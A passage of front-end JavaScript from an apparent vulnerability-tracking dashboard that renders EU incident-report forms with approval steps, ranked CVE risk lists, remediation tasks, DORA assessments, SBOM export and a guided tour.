    const d = done[s], locked = !d && STAGE_ORDER.slice(0, i).some((p) => !done[p]);
    const sub = d ? '✓ sent' : pend[s] ? 'awaiting approval' : locked ? 'after step ' + i : STAGE_WHEN[s];
    return `<button data-stage="${s}" ${locked ? 'disabled' : ''} class="flex-1 text-left rounded-xl border px-3 py-2 ${s === STAGE ? '' : 'opacity-70 hover:opacity-100'} disabled:opacity-40"
      style="border-color:${s === STAGE ? 'var(--cyan)' : 'var(--line)'};${d ? 'background:rgba(62,224,143,.05)' : ''}">
      <div class="text-[10px] font-mono text-faint">STEP ${i + 1}</div>
      <div class="text-sm font-medium">${STAGE_NAME[s]}</div>
      <div class="text-[11px] mt-0.5" style="color:${d ? 'var(--green)' : 'var(--muted)'}">${esc(sub)}</div></button>`;
  }).join('');
  const st = R.stages[STAGE], d = done[STAGE], pd = pend[STAGE];
  const ro = !R.can_prepare || !!d || !!pd;
  const fields = st.fields.map((f) => {
    const val = d ? (d.fields[f.key] ?? '') : pd ? (pd.fields[f.key] ?? '') : f.value;
    const input = f.kind === 'textarea'
      ? `<textarea data-k="${f.key}" rows="${Math.min(6, Math.max(2, Math.ceil((val || '').length / 75)))}" class="field" ${ro ? 'readonly' : ''}>${esc(val)}</textarea>`
      : f.kind === 'select'
        ? `<select data-k="${f.key}" class="field" ${ro ? 'disabled' : ''}>${f.options.map((o) => `<option ${o === val ? 'selected' : ''}>${esc(o)}</option>`).join('')}</select>`
        : `<input data-k="${f.key}" class="field" value="${esc(val)}" ${ro ? 'readonly' : ''} />`;
    const fromData = f.source.startsWith('graph');
    return `<label class="block"><div class="flex items-center justify-between gap-2 mb-1">
        <span class="text-xs font-medium">${esc(f.label)}${f.required ? '' : ' <span class="text-faint font-normal">(optional)</span>'}</span>
        <span class="text-[10px] ${fromData ? 'text-green' : 'text-faint'}" title="${fromData ? 'Filled in from this incident and Fernwave\'s records' : esc(f.source)}">${fromData ? '✓ from your data' : esc(f.source)}</span></div>${input}</label>`;
  }).join('');
  const allSent = STAGE_ORDER.every((s) => done[s]);
  $('drawer-body').innerHTML = `
    <div class="grid grid-cols-3 gap-2">
      <div class="rounded-xl border hair p-3"><div class="text-[11px] text-faint">Team found out</div>
        <div class="font-mono text-sm mt-0.5">${aware.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</div><div class="text-[11px] text-faint truncate">${esc(R.awareness_by || '?')}</div></div>
      <div class="rounded-xl border hair p-3"><div class="text-[11px] text-faint">${ew ? 'First alert sent after' : 'Time used so far'}</div>
        <div class="font-mono text-sm mt-0.5 text-green">${ew ? dur(ew.minutes_after_awareness) : dur(elapsed)}</div><div class="text-[11px] text-faint">of 24 hours allowed</div></div>
      <div class="rounded-xl border hair p-3" title="Our estimate of tracing this by hand through spreadsheets, code and chat"><div class="text-[11px] text-faint">Doing it by hand</div>
        <div class="font-mono text-sm mt-0.5 text-amber">1–3 days</div><div class="text-[11px] text-faint">our estimate</div></div>
    </div>
    <div class="flex gap-2">${tabs}</div>
    ${!R.can_prepare ? `<div class="rounded-xl border px-3 py-2 text-xs" style="border-color:rgba(255,84,112,.4);color:#FFB3C0">Read-only for ${esc(roleLabel(USER))}. The security team prepares EU reports and the security lead sends them.</div>` : ''}
    ${pd ? `<div class="rounded-xl border px-3 py-2.5 text-sm" style="border-color:rgba(255,181,71,.45);background:rgba(255,181,71,.05)">
        <div class="font-medium text-amber">Waiting for the security lead's approval</div>
        <div class="text-xs text-muted mt-0.5">Prepared by ${esc(pd.prepared_by)} at ${timeOf(pd.prepared_ts)}. ${R.can_send ? 'Review it, then approve and send.' : 'It goes out as soon as it is approved.'}</div></div>` : ''}
    ${allSent ? `<div class="rounded-xl border px-3 py-2.5 text-sm" style="border-color:rgba(62,224,143,.4);background:rgba(62,224,143,.05)"><b class="text-green">All three reports are sent.</b> <span class="text-muted">Nothing more to do for this bug.</span></div>`
      : d ? `<div class="rounded-xl border px-3 py-2.5 text-sm" style="border-color:rgba(62,224,143,.4);background:rgba(62,224,143,.05)">
        <div class="font-medium text-green">✓ Sent · reference ${esc(d.ref)}</div>
        <div class="text-xs text-muted mt-0.5">by ${esc(d.by)} at ${timeOf(d.ts)}, ${dur(d.minutes_after_awareness)} after the team found out · ${d.on_time ? 'on time' : '<span class="text-red">late</span>'}</div></div>` : ''}
    <div class="text-xs text-muted">${esc(STAGE_NAME[STAGE])} · due ${esc(STAGE_WHEN[STAGE])} · <span class="text-faint">${esc(st.article)}</span></div>
    <div class="space-y-3">${fields}</div>
    <div class="flex flex-wrap items-center gap-2 pt-1">
      ${!ro ? `<button id="submit" class="rounded-xl px-4 py-2 font-medium text-ink" style="background:linear-gradient(90deg,var(--violet),var(--cyan))">${R.can_send ? `Send ${esc(STAGE_NAME[STAGE].toLowerCase())} →` : 'Send for approval →'}</button>` : ''}
      ${pd && R.can_send ? `<button id="approve" class="rounded-xl px-4 py-2 font-medium text-ink" style="background:var(--amber)">Approve and send →</button>` : ''}
      <button id="dl" class="btn">⤓ Download</button>
    </div>
    <div id="formerr" class="text-xs text-red"></div>
    <p class="text-[11px] text-faint border-t hair pt-3">In real life this goes to <abbr data-g="ENISA">ENISA</abbr> and the national cyber team. Missing it can cost ${esc(R.max_fine.replace('up to ', 'up to '))}.</p>`;
  glossary($('drawer-body'));
  $('drawer-body').querySelectorAll('[data-stage]').forEach((b) => b.onclick = () => { STAGE = b.dataset.stage; renderReport(); });
  $('dl').onclick = () => download(`EU-report-${STAGE}-${R.cve}-${INCIDENT}.json`, JSON.stringify({ stage: STAGE, cve: R.cve, incident: INCIDENT, fields: collect() }, null, 2), 'application/json');
  $('submit')?.addEventListener('click', submitStage);
  $('approve')?.addEventListener('click', approveStage);
}
async function approveStage() {
  const b = $('approve'); b.disabled = true; b.textContent = 'Sending…';
  try {
    const r = await api(`/api/report/${encodeURIComponent(INCIDENT)}/${encodeURIComponent(REPORT.cve)}/${STAGE}/approve`, { method: 'POST' });
    toast(`✓ <b>${esc(STAGE_NAME[r.stage])}</b> approved and sent, ${dur(r.minutes_after_awareness)} after the team found out`, 4500);
    await refreshMemory(); await loadReport(REPORT.cve);
  } catch (e) { $('formerr').textContent = e.message; b.disabled = false; b.textContent = 'Try again'; }
}
function collect() {
  return Object.fromEntries([...$('drawer-body').querySelectorAll('[data-k]')].map((el) => [el.dataset.k, el.value]));
}
async function submitStage() {
  const b = $('submit'); b.disabled = true; b.textContent = 'Sending…'; $('formerr').textContent = '';
  try {
    const r = await api(`/api/report/${encodeURIComponent(INCIDENT)}/${encodeURIComponent(REPORT.cve)}/${STAGE}`,
      { method: 'POST', body: JSON.stringify({ fields: collect() }) });
    toast(r.state === 'awaiting_approval' ? `Sent to the security lead for approval` :
      `✓ <b>${esc(STAGE_NAME[r.stage])}</b> sent, ${dur(r.minutes_after_awareness)} after the team found out`, 4500);
    await refreshMemory();
    await loadReport(REPORT.cve);
  } catch (e) { $('formerr').textContent = e.message; b.disabled = false; b.textContent = 'Try again'; }
}

// side panels
let PANEL = null, PANEL_SHOW = null;
function openPanel(title, tabs, render, kind = null, start = 0) {
  PANEL = kind;
  $('panel-title').textContent = title;
  $('panel-tabs').innerHTML = tabs.map((t, i) => `<button data-tab="${i}" class="px-2.5 py-1 rounded-md border border-transparent text-muted hover:text-fg">${esc(t)}</button>`).join('');
  $('panel-tabs').classList.toggle('hidden', tabs.length < 2);
  const show = (i) => {
    $('panel-tabs').querySelectorAll('[data-tab]').forEach((b) => b.style.cssText = +b.dataset.tab === i ? 'background:var(--raised);color:var(--fg);border-color:var(--line2)' : '');
    $('panel-body').innerHTML = '<div class="text-sm text-muted">loading…</div>';
    render(i).catch((e) => { $('panel-body').innerHTML = `<div class="text-sm text-red">${esc(e.message)}</div>`; });
  };
  let cur = Math.min(start, tabs.length - 1);
  $('panel-tabs').querySelectorAll('[data-tab]').forEach((b) => b.onclick = () => show(cur = +b.dataset.tab));
  PANEL_SHOW = () => show(cur);
  $('panel').classList.remove('hidden');
  show(cur);
}
function closePanel() { $('panel').classList.add('hidden'); }
$('panel-x').onclick = closePanel; $('panel-bg').onclick = closePanel;
const pct = (x) => x == null ? '–' : `${Math.round(100 * x)}%`;

async function sourcesFoot() {
  try {
    const s = await (await fetch('/api/sources')).json();
    $('panel-foot').innerHTML = s.real_data
      ? `Data: CISA KEV catalog ${esc(s.kev.catalogVersion)} (${s.kev.count.toLocaleString()} exploited CVEs) · ${s.osv.advisories} OSV.dev advisories for Fernwave's exact package versions · FIRST EPSS ${esc(s.epss.date)} · fetched ${new Date(s.fetched_at).toLocaleDateString()}`
      : 'Real-data snapshot not loaded: run backend/ingest_real.py';
  } catch { $('panel-foot').textContent = ''; }
}

async function renderAlertsTab() {
  await refreshAlerts();
  $('panel-foot').textContent = '';
  $('panel-body').innerHTML = `<div class="flex items-center justify-between mb-3"><div class="text-sm text-muted">${plural(ALERTS.filter((a) => a.status === 'new').length, 'new alert')}</div>
    ${may('investigate') ? '<button class="btn !text-[11px]" data-scan title="Run the watcher agent now">↻ Scan now</button>' : ''}</div>
    <div class="space-y-2">${signalsHTML()}</div>`;
  wireSignals($('panel-body'));
}
async function renderTasksTab() {
  await refreshTasks();
  $('panel-foot').textContent = '';
  const open = TASKS.tasks.filter((t) => t.status === 'open'), done = TASKS.tasks.filter((t) => t.status !== 'open');
  if (!TASKS.tasks.length) { $('panel-body').innerHTML = `<div class="text-sm text-muted">Nothing assigned to ${USER.access === 'eng_manager' ? 'your team' : 'you'}. 🎉</div>`; return; }
  const card = (t, i) => {
    const canFix = t.status === 'open' && (may('remediate_any') || (may('remediate_team') && USER.owns.includes(t.product)));
    return `<div class="rounded-xl border hair p-3.5 mb-2.5 ${t.status === 'open' ? '' : 'opacity-60'}">
      <div class="flex items-start gap-3"><span class="dot mt-1.5" style="background:${t.status === 'open' ? 'var(--amber)' : 'var(--green)'}"></span>
        <div class="flex-1 min-w-0"><div class="text-sm font-medium">${esc(t.task)}</div>
          <div class="text-[11px] text-faint mt-1">from ${esc(t.assigned_by)} · to ${esc(t.assigned_to)} · incident <span class="font-mono">${esc(t.incident)}</span>${t.tickets.length ? ` · tracked in ${esc(t.tickets.join(', '))}` : ''}</div></div></div>
      ${canFix ? `<div class="mt-2.5 flex gap-2"><input class="field !py-1.5 flex-1" data-note="${i}" placeholder="What shipped? e.g. release 1.9.1 with the patched library" />
        <button class="rounded-lg px-3 py-1.5 text-xs font-medium text-ink flex-none" style="background:var(--green)" data-done="${i}">Mark shipped</button></div>` : ''}
    </div>`;
  };
  const all = [...open, ...done];
  $('panel-body').innerHTML = (open.length ? `<div class="text-[11px] uppercase tracking-[.15em] text-faint mb-2">Open</div>${open.map((t) => card(t, all.indexOf(t))).join('')}` : '')
    + (done.length ? `<div class="text-[11px] uppercase tracking-[.15em] text-faint mt-4 mb-2">Done</div>${done.map((t) => card(t, all.indexOf(t))).join('')}` : '');
  $('panel-body').querySelectorAll('[data-note]').forEach((f) => {
    const id = all[f.dataset.note].id;
    if (DRAFTS[id]) f.value = DRAFTS[id];
    f.oninput = () => { DRAFTS[id] = f.value; };
  });
  $('panel-body').querySelectorAll('[data-done]').forEach((b) => b.onclick = async () => {
    const t = all[b.dataset.done], note = $('panel-body').querySelector(`[data-note="${b.dataset.done}"]`).value;
    delete DRAFTS[t.id];
    try {
      const r = await api('/api/remediate', { method: 'POST', body: JSON.stringify({ incident_id: t.incident, cve_id: t.cve, product: t.product, note }) });
      toast(`✓ ${esc(r.message)}`, 4000); refreshMemory(); PANEL_SHOW?.();
    } catch (e) { toast(esc(e.message)); }
  });
}
async function renderRisksTab() {
  sourcesFoot();
  const d = await api('/api/queue?limit=15');
  $('panel-body').innerHTML = `
    <p class="text-sm text-muted mb-3">Every open vulnerability across all products, not just the new ones, ranked by what to fix first.</p>
    <div class="grid grid-cols-3 gap-2 mb-4">
      <div class="rounded-xl border hair p-3"><div class="text-[11px] text-faint">Open vulnerabilities</div><div class="font-mono text-lg">${d.open_vulnerabilities}</div></div>
      <div class="rounded-xl border p-3" style="border-color:rgba(255,84,112,.4)"><div class="text-[11px] text-faint">Being exploited</div><div class="font-mono text-lg text-red">${d.actively_exploited}</div></div>
      <div class="rounded-xl border hair p-3"><div class="text-[11px] text-faint">Product exposures</div><div class="font-mono text-lg">${d.exposures}</div></div>
    </div>
    <div class="space-y-2">${d.queue.map((q, i) => `
      <div class="rounded-xl border hair p-3 ${may('investigate') ? 'hover:border-faint cursor-pointer' : ''}" data-q="${esc(q.cve)}">
        <div class="flex items-start gap-3">
          <div class="font-mono text-faint text-sm w-5">${i + 1}</div>
          <div class="flex-1 min-w-0">
            <div class="flex flex-wrap items-center gap-1.5"><span class="font-mono text-sm">${esc(q.cve)}</span>
              ${q.actively_exploited ? '<span class="chip !text-[10px] text-red" style="border-color:rgba(255,84,112,.4)">exploited</span>' : ''}
              ${q.known_ransomware_use ? '<span class="chip !text-[10px] text-red" style="border-color:rgba(255,84,112,.4)">ransomware</span>' : ''}
              ${q.products.some((p) => p.eu_report_required) ? '<span class="chip !text-[10px] text-violet" style="border-color:rgba(139,92,246,.45)">EU report</span>' : ''}</div>
            <div class="text-sm mt-0.5 truncate">${esc(q.title)}</div>
            <div class="text-[11px] text-faint mt-1">${q.products.map((p) => `${esc(p.product)} <span class="font-mono">(${esc(p.component.replace('@', ' '))}${p.fixed_in ? ' → ' + esc(p.fixed_in) : ''})</span>`).join(' · ')}</div>
          </div>
          <div class="text-right text-[11px] flex-none"><div class="text-faint">EPSS</div><div class="font-mono">${pct(q.epss)}</div>
            <div class="text-faint mt-1">CVSS</div><div class="font-mono">${q.cvss ?? '–'}</div></div>
        </div></div>`).join('')}</div>
    <p class="text-[11px] text-faint mt-3">Order: ${esc(d.ranking)}.</p>`;
  $('panel-body').querySelectorAll('[data-q]').forEach((el) => el.onclick = () => {
    if (!may('investigate')) return;
    closePanel(); ask(`Are we affected by ${el.dataset.q}?`);
  });
}
async function renderProductsTab() {
  sourcesFoot();
  const rows = await api('/api/products');
  $('panel-body').innerHTML = `<table class="w-full text-sm"><thead><tr class="text-[11px] text-faint text-left">
      <th class="py-1.5 font-normal">Product</th><th class="font-normal">Team</th><th class="font-normal text-right">Vulnerabilities</th><th class="font-normal text-right">Exploited</th><th></th></tr></thead>
    <tbody>${rows.map((r) => `<tr class="border-t hair">
      <td class="py-2"><div class="font-medium">${esc(r.product)}</div><div class="text-[11px] text-faint">${esc(r.version)} · ${esc(r.category)}${r.cra_in_scope ? '' : ' · DORA'}</div></td>
      <td class="text-muted">${esc(r.owner_team || '')}</td><td class="text-right font-mono">${r.vulnerabilities}</td>
      <td class="text-right font-mono ${r.actively_exploited ? 'text-red' : 'text-faint'}">${r.actively_exploited}</td>
      <td class="text-right">${may('export_sbom') ? `<button class="btn" data-sbom="${esc(r.product)}">⤓ SBOM</button>` : ''}</td></tr>`).join('')}</tbody></table>
    <p class="text-[11px] text-faint mt-3">SBOM = software bill of materials (CycloneDX 1.5), with each part's known vulnerabilities. The CRA requires manufacturers to keep one.</p>`;
  $('panel-body').querySelectorAll('[data-sbom]').forEach((b) => b.onclick = async () => {
    const bom = await api('/api/sbom/' + encodeURIComponent(b.dataset.sbom));
    download(`sbom-${b.dataset.sbom.replace(/\s+/g, '-')}.cdx.json`, JSON.stringify(bom, null, 2), 'application/json');
  });
}
// Inbox tabs: alerts, my tasks, all risks, by product
function openInbox(start = 0) {
  const tabs = [['Alerts', renderAlertsTab, true], ['My tasks', renderTasksTab, may('investigate')],
                ['All risks', renderRisksTab, true], ['By product', renderProductsTab, true]].filter((t) => t[2]);
  openPanel('Inbox', tabs.map((t) => t[0]), (i) => tabs[i][1](), 'inbox', start);
  updateInboxTabs();
}
// someone else may assign you a fix
setInterval(() => { if (USER && document.visibilityState === 'visible') { refreshAlerts(); refreshTasks(); } }, 30000);
$('inboxbtn').onclick = () => openInbox(0);

function openIncident() {
  const tabs = may('view_audit') ? ['Decisions', 'Timeline'] : ['Decisions'];
  openPanel(`Incident ${INCIDENT}`, tabs, async (tab) => {
    if (tab === 0) {
      $('panel-foot').textContent = '';
      const b = await api('/api/incident/' + encodeURIComponent(INCIDENT));
      const intro = `<div class="flex justify-end mb-3"><button class="btn" id="copyinc">Copy incident ID</button></div>`;
      $('panel-body').innerHTML = b.assessed.length ? b.assessed.map((a, i) => {
        const [t, c] = decision(a.verdict || '');
        const fixed = b.remediated.some((r) => r.cve === a.cve && r.product === a.product);
        const dora = b.dora.find((r) => r.cve === a.cve && r.product === a.product);
        return `<div class="rounded-xl border hair p-3.5 mb-2.5 flex items-center gap-3">
          <span class="dot" style="background:${fixed ? 'var(--green)' : c}"></span>
          <div class="flex-1 min-w-0"><div class="text-sm font-medium">${esc(a.product)}${USER.owns.includes(a.product) ? ' <span class="text-cyan text-xs">· yours</span>' : ''}</div>
            <div class="text-xs mt-0.5"><span style="color:${c}">${t}</span> <span class="text-faint">· ${esc(a.cve)} · ${esc(a.by)}, ${timeOf(a.ts)}</span>
            ${fixed ? '<span class="text-green"> · ✓ fixed</span>' : ''}${dora ? '<span class="text-amber"> · DORA assessed</span>' : ''}</div></div>
          <button class="btn flex-none" data-dec="${i}">Open</button></div>`;
      }).join('') : '<p class="text-sm text-faint">No decisions yet. Ask about a CVE to start.</p>';
      $('panel-body').innerHTML = intro + $('panel-body').innerHTML;
      $('copyinc').onclick = () => { navigator.clipboard?.writeText(INCIDENT); toast('Incident ID copied'); };
      $('panel-body').querySelectorAll('[data-dec]').forEach((el) => el.onclick = (e) => { e.stopPropagation(); openChip(b.assessed[el.dataset.dec], el); });
      return;
    }
    $('panel-foot').textContent = '';
    const items = await api('/api/timeline/' + encodeURIComponent(INCIDENT));
    const color = { aware: 'var(--amber)', fix: 'var(--green)', report: 'var(--violet)', dora: 'var(--amber)', tool: 'var(--faint)' };
    $('panel-body').innerHTML = items.length ? `<ol class="relative border-l hair ml-2 space-y-3">${items.map((t) => `
      <li class="ml-4"><span class="absolute -left-[5px] mt-1.5 dot" style="background:${t.status === 'denied' ? 'var(--red)' : color[t.kind]}"></span>
        <div class="text-[11px] text-faint font-mono">${new Date(t.ts).toLocaleString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })} · ${esc(t.actor || 'system')}</div>
        <div class="text-sm ${t.kind === 'tool' ? 'text-muted' : ''}">${esc(t.text)}${t.status === 'denied' ? ' <span class="text-red text-xs">· denied</span>' : ''}</div></li>`).join('')}</ol>`
      : '<p class="text-sm text-faint">Nothing has happened on this incident yet.</p>';
  }, 'incident');
}

// decision chip actions: mark fixed, DORA assessment
let DORA_OUTCOMES = [];
fetch('/api/dora/outcomes').then((r) => r.json()).then((o) => { DORA_OUTCOMES = o; }).catch(() => {});
// typed notes survive closing the popup, until they're saved
const DRAFTS = {};
function openChip(a, anchor) {
  const pop = $('chippop'), [t, c] = decision(a.verdict || ''), key = `${a.cve}|${a.product}`;
  const draft = (DRAFTS[key] ||= {});
  const fix = BOARD.remediated.find((r) => r.cve === a.cve && r.product === a.product);
  const dora = BOARD.dora.find((r) => r.cve === a.cve && r.product === a.product);
  const canFix = !fix && (may('remediate_any') || (may('remediate_team') && USER.owns.includes(a.product)));
  const isDora = (a.verdict || '').startsWith('LIKELY OUT');
  pop.innerHTML = `
    <div class="flex items-start justify-between gap-2"><div><div class="font-medium">${esc(a.product)}</div>
      <div class="text-xs mt-0.5"><span style="color:${c}">${t}</span> <span class="text-faint">· ${esc(a.cve)} · by ${esc(a.by)}</span></div></div>
      <button class="btn" id="popx">✕</button></div>
    <p class="mt-2.5 text-xs text-muted leading-relaxed">${decisionWhy(a.verdict || '')}</p>
    ${fix ? `<div class="mt-3 text-sm rounded-lg border px-3 py-2" style="border-color:rgba(62,224,143,.4)"><span class="text-green">✓ Fix shipped</span>
        <div class="text-xs text-muted mt-0.5">${esc(fix.note)} · ${esc(fix.by)}, ${timeOf(fix.ts)}</div></div>`
      : canFix ? `<div class="mt-3"><label class="text-xs text-muted">What shipped?</label>
        <textarea id="fixnote" rows="2" class="field mt-1" placeholder="e.g. release 1.9.1 with the patched library, rolled out to all customers"></textarea>
        <button id="fixbtn" class="mt-2 rounded-lg px-3 py-1.5 text-sm font-medium text-ink" style="background:var(--green)">Mark fix shipped</button></div>`
      : `<div class="mt-3 text-xs text-faint">Not fixed yet. ${may('remediate_team') ? `Only the owning team or the security lead can mark ${esc(a.product)} fixed.` : 'Your role can\'t record fixes.'}</div>`}
    ${isDora ? (dora ? `<div class="mt-3 text-sm rounded-lg border px-3 py-2" style="border-color:rgba(255,181,71,.4)"><span class="text-amber">DORA assessment</span>
        <div class="text-xs text-muted mt-0.5">${esc(dora.outcome)}${dora.note ? ' · ' + esc(dora.note) : ''} · ${esc(dora.by)}</div></div>`
      : may('dora_assess') ? `<div class="mt-3 border-t hair pt-3"><label class="text-xs text-muted">DORA assessment (financial service)</label>
        <select id="doraout" class="field mt-1">${DORA_OUTCOMES.map((o) => `<option>${esc(o)}</option>`).join('')}</select>
        <input id="doranote" class="field mt-1.5" placeholder="Note (optional)" />
        <button id="dorabtn" class="mt-2 rounded-lg px-3 py-1.5 text-sm font-medium text-ink" style="background:var(--amber)">Record assessment</button></div>`
      : '<div class="mt-3 text-xs text-faint">A financial service: Compliance records the DORA assessment.</div>') : ''}
    <div id="poperr" class="text-xs text-red mt-2"></div>`;
  if (anchor instanceof Element) {
    const r = anchor.getBoundingClientRect();
    pop.style.left = Math.min(Math.max(12, r.left), innerWidth - 352) + 'px';
    pop.style.top = Math.max(12, r.top - 12 - 260) + 'px';
    requestAnimationFrame(() => { pop.style.top = Math.max(12, r.top - 12 - pop.offsetHeight) + 'px'; });
  }
  pop.classList.remove('hidden');
  $('popx').onclick = () => pop.classList.add('hidden');
  for (const id of ['fixnote', 'doranote', 'doraout']) {
    const field = $(id);
    if (!field) continue;
    if (draft[id] != null) field.value = draft[id];
    field.oninput = field.onchange = () => { draft[id] = field.value; };
  }
  const reopen = async () => { await refreshMemory(); const fresh = BOARD.assessed.find((x) => x.cve === a.cve && x.product === a.product) || a; openChip(fresh, null); };
  $('fixbtn')?.addEventListener('click', async () => {
    try {
      await api('/api/remediate', { method: 'POST', body: JSON.stringify({ incident_id: INCIDENT, cve_id: a.cve, product: a.product, note: $('fixnote').value }) });
      delete draft.fixnote; toast(`✓ ${esc(a.product)} marked fixed`); await reopen();
    } catch (e) { $('poperr').textContent = e.message; }
  });
  $('dorabtn')?.addEventListener('click', async () => {
    try {
      await api('/api/dora', { method: 'POST', body: JSON.stringify({ incident_id: INCIDENT, cve_id: a.cve, product: a.product, outcome: $('doraout').value, note: $('doranote').value }) });
      delete draft.doranote; delete draft.doraout; toast('DORA assessment recorded'); await reopen();
    } catch (e) { $('poperr').textContent = e.message; }
  });
}
document.addEventListener('click', (e) => { if (!$('chippop').contains(e.target)) $('chippop').classList.add('hidden'); });

// guided tour: what each part is for, in plain words
const TOUR = [
  { el: null, title: 'Welcome to plexus', text: 'Trace a new vulnerability to every product it reaches, assign the fix, and file your EU reports on time.' },
  { el: '#signals', title: 'Start here', text: 'The newest alert: a bug attackers are using that reaches something Fernwave ships. Click <b>Check</b> to see what it hits.' },
  { el: '#chatcard', title: 'Ask in plain English', text: 'Answers come only from your graph. If something isn\'t there, plexus says so instead of guessing.' },
  { el: '#graphcard', title: 'The map, three ways', text: '<b>Path</b>: <span style="color:#FF5470">the bug</span> → <span style="color:#22D3EE">the software parts it hides in</span> → <span style="color:#8B5CF6">your products</span> → <span style="color:#FFB547">the team</span> → <span style="color:#3EE08F">the person to call</span>. <b>Blast radius</b>: the bug in the centre, one ring per step, so you see how far it spreads. <b>Whole company</b>: everything, with the answer lit up.' },
  { el: '#incident', title: 'Incident', text: 'Every decision is saved with who made it: <span style="color:var(--red)">must report</span>, <span style="color:var(--amber)">finance rules (DORA)</span> or <span style="color:var(--green)">no report needed</span>. Mark fixes shipped and record DORA assessments here; leads and auditors also see the full timeline.' },
  { el: '#inboxbtn', title: 'Inbox', text: 'Everything that needs you, in one place: <b>Alerts</b> (new from the watcher), <b>My tasks</b> (fixes handed to you, linked to their ticket), and <b>All risks</b> (every open vulnerability, ranked, with SBOM export).' },
  { el: '#clockbox', title: 'The legal clock', text: 'A <b>first alert within 24 hours</b> and a <b>full report within 72</b>. When a report is sent, its bar turns green.' },
  { el: '#me', title: 'Roles', text: 'Engineers check and mark their own fixes. Analysts prepare EU reports; the <b>security lead</b> approves and sends them. Compliance records DORA assessments. The CISO and auditors see everything read-only. Click <b>Switch</b> to try another seat.' },
];
let TI = -1;
function startTour() { store.set('toured', '1'); closeDrawer(); TI = 0; $('tour').classList.remove('hidden'); showStep(0); }
function endTour() { TI = -1; $('tour').classList.add('hidden'); }
function target(step) {
  for (const sel of [step.el, step.alt]) {
    const el = sel && document.querySelector(sel);
    if (el && el.getBoundingClientRect().width > 0) return el;
  }
  return null;
}
function showStep(dir) {
  // skip steps whose element isn't on screen yet
  while (TI > 0 && TI < TOUR.length && TOUR[TI].el && !target(TOUR[TI])) TI += dir || 1;
  if (TI >= TOUR.length) return endTour();
  const step = TOUR[TI], el = step.el ? target(step) : null, spot = $('tour-spot'), tip = $('tour-tip');
  $('tour-n').textContent = `${TI + 1} / ${TOUR.length}`;
  $('tour-title').textContent = step.title;
  $('tour-text').innerHTML = step.text;
  $('tour-back').style.visibility = TI ? 'visible' : 'hidden';
  $('tour-next').textContent = TI === TOUR.length - 1 ? 'done ✓' : 'next →';
  if (!el) {
    Object.assign(spot.style, { left: '50%', top: '45%', width: '0px', height: '0px' });
    Object.assign(tip.style, { left: `calc(50% - ${Math.min(340, innerWidth - 32) / 2}px)`, top: '35%' });
    return;
  }
  el.scrollIntoView({ block: 'nearest' });
  const r = el.getBoundingClientRect(), pad = 6;
  Object.assign(spot.style, { left: r.left - pad + 'px', top: r.top - pad + 'px', width: r.width + pad * 2 + 'px', height: r.height + pad * 2 + 'px' });
  const tw = Math.min(340, innerWidth - 32), th = tip.offsetHeight || 180;
  let left = Math.min(Math.max(16, r.left), innerWidth - tw - 16);
  let top = r.bottom + 14;
  if (top + th > innerHeight - 16) top = r.top - th - 14;
  if (top < 16) { top = Math.min(innerHeight - th - 16, r.top + 16); left = Math.min(Math.max(16, r.right - tw - 16), innerWidth - tw - 16); }
  Object.assign(tip.style, { left: left + 'px', top: top + 'px' });
}
$('tour-next').onclick = () => { if (TI >= TOUR.length - 1) return endTour(); TI++; showStep(1); };
$('tour-back').onclick = () => { if (TI > 0) { TI--; showStep(-1); } };
$('tour-skip').onclick = endTour;
$('tourbtn').onclick = startTour;
addEventListener('resize', () => { if (TI >= 0) showStep(0); });

// map: three views of the same graph
const CORE_EDGES = new Set(['AFFECTS', 'DEPENDS_ON', 'SHIPS', 'OWNS', 'MEMBER_OF']);
const OWNERSHIP = new Set(['OWNS', 'MEMBER_OF']);
let network = null, nodesDS, edgesDS, FULL = null, BASE = {}, LEVEL = {}, EDGE_INDEX = {}, graphReady = false;
let LAST = null, VIEW = 'company', timer = null;

function computeLevels(g) {
  const deps = {};
  g.edges.filter((e) => e.label === 'DEPENDS_ON').forEach((e) => (deps[e.from] ||= []).push(e.to));
  const memo = {};
  const depth = (id, seen = new Set()) => {
    if (memo[id]) return memo[id];
    if (seen.has(id)) return 1;                         // cycle guard
    seen.add(id);
    return (memo[id] = 1 + Math.max(0, ...(deps[id] || []).map((d) => depth(d, seen))));
  };
  g.nodes.filter((n) => n.group === 'Component').forEach((n) => depth(n.id));
  const maxC = Math.max(1, ...Object.values(memo));
  g.nodes.forEach((n) => { LEVEL[n.id] = { Vulnerability: 0, Component: memo[n.id], Product: maxC + 1, Team: maxC + 2, Person: maxC + 3 }[n.group]; });
}

function style(n, state, view) {   // state: base | dim | hot
  const c = COLOR[n.group], big = n.group === 'Product' || n.group === 'Vulnerability';
  const a = state === 'dim' ? .22 : state === 'hot' ? 1 : .7;
  const showLabel = state === 'hot' || (state === 'base' && (big || n.group === 'Team'));
  return {
    shape: n.group === 'Vulnerability' ? 'diamond' : n.group === 'Product' ? 'hexagon' : n.group === 'Team' ? 'triangle' : 'dot',
    size: state === 'hot' ? (big ? 18 : 12) : big ? (view === 'company' ? 14 : 11) : n.group === 'Team' ? 9 : 6,
    color: { background: rgba(c, a), border: state === 'hot' ? '#ffffff' : rgba(c, Math.min(1, a + .2)),
             highlight: { background: c, border: '#fff' }, hover: { background: c, border: '#fff' } },
    borderWidth: state === 'hot' ? 2 : 1,
    shadow: state === 'hot' || (view === 'company' && big) ? { enabled: true, color: rgba(c, .9), size: state === 'hot' ? 18 : 10, x: 0, y: 0 } : false,
    font: { face: 'Geist', size: showLabel ? (state === 'hot' ? 13 : 11) : 0,
            color: state === 'hot' ? '#fff' : 'rgba(210,214,228,.8)', strokeWidth: 4, strokeColor: '#07080D' },
  };
}
function rgba(hex, a) { const n = parseInt(hex.slice(1), 16); return `rgba(${n >> 16},${(n >> 8) & 255},${n & 255},${a})`; }
function edgeStyle(e, view) {
  const own = OWNERSHIP.has(e.label);
  return { color: { color: own ? 'rgba(139,92,246,.28)' : 'rgba(34,211,238,.18)' }, width: 1, label: '',
           dashes: own ? [3, 4] : false, smooth: view === 'path' ? { type: 'cubicBezier', forceDirection: 'horizontal', roundness: .45 } : { type: 'continuous' } };
}

async function loadGraph() {
  const g = await (await fetch('/api/graph')).json();
  g.nodes = g.nodes.filter((n) => COLOR[n.group]);
  const ids = new Set(g.nodes.map((n) => n.id));
  g.edges = g.edges.filter((e) => CORE_EDGES.has(e.label) && ids.has(e.from) && ids.has(e.to));
  g.nodes.forEach((n) => { BASE[n.id] = n; });
  computeLevels(g);
  FULL = g;
  graphReady = true;
